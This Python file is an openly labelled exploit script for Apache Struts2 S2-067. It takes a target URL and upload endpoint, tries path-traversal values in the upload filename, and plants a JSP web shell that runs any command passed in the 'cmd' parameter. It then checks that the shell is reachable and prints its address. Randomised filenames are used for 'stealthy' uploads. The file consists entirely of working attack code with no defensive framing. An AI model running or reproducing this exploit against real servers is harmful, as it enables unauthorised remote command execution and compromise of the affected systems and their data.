import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import string


def generate_random_filename(extension=".jsp"):
    """Generate a random filename for stealthy payload uploads."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension


def create_payload():
    """Create the payload to be uploaded."""
    return """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
    }
%>"""


def exploit_s2_067(target_url, upload_endpoint, paths, malicious_filename, payload_content):
    """
    Exploit S2-067 by testing multiple path traversal patterns and uploading a malicious file.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Exploiting S2-067 at {upload_url}...")

    results = []
    for path in paths:
        print(f"[INFO] Testing path traversal with: {path}")

        # Construct multipart data
        files = {
            "Upload": (malicious_filename, payload_content, "application/octet-stream"),
            "uploadFileName": f"{path}/{malicious_filename}"
        }

        # Generate a dynamic boundary for multipart requests
        boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        m = MultipartEncoder(fields=files, boundary=boundary)
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": m.content_type,
        }

        # Send the exploit request
        try:
            response = requests.post(upload_url, headers=headers, data=m, timeout=10)
            if response.status_code == 200:
                print(f"[SUCCESS] Uploaded file with path: {path}/{malicious_filename}")
                results.append((path, "Success"))
                verify_uploaded_file(target_url, path, malicious_filename)
            else:
                print(f"[ERROR] Exploit failed for path: {path}. HTTP Status: {response.status_code}")
                results.append((path, f"Failed: HTTP {response.status_code}"))
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Exploit failed for path: {path}. Exception: {e}")
            results.append((path, f"Error: {e}"))

    # Print final results
    print("\n[RESULTS]")
    for path, status in results:
        print(f"Path: {path} | Status: {status}")


def verify_uploaded_file(target_url, path, malicious_filename):
    """Verify if the uploaded malicious file is accessible and executable."""
    file_url = urljoin(target_url, f"{path}/{malicious_filename}")
    print(f"[INFO] Verifying uploaded file at {file_url}...")

    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200 and "cmd" in response.text:
            print(f"[ALERT] Exploit successful! Webshell available at: {file_url}?cmd=<COMMAND>")
        elif response.status_code == 404:
            print(f"[INFO] File not found at {file_url}. The target might not be vulnerable.")
        else:
            print(f"[INFO] Unexpected response for {file_url}. HTTP Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Verification failed for {file_url}. Exception: {e}")


def main():
    parser = argparse.ArgumentParser(description="Apache Struts2 S2-067 Exploit Script")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", required=True, help="Path to file upload endpoint (e.g., /upload.action)")
    parser.add_argument("--malicious_filename", default=generate_random_filename(),
                        help="Name for the malicious file")
    parser.add_argument("--payload", help="Custom payload content (JSP code)", default=create_payload())
    parser.add_argument("--paths", nargs="+", required=True,
                        help="Custom paths to test for file upload (e.g., '../../..', '../webapps/ROOT')")

    args = parser.parse_args()

    print("[INFO] Starting Apache Struts2 S2-067 Exploit...")
    exploit_s2_067(args.url, args.upload_endpoint, args.paths, args.malicious_filename, args.payload)
    print("[INFO] Exploit process completed.")


if __name__ == "__main__":
    main()
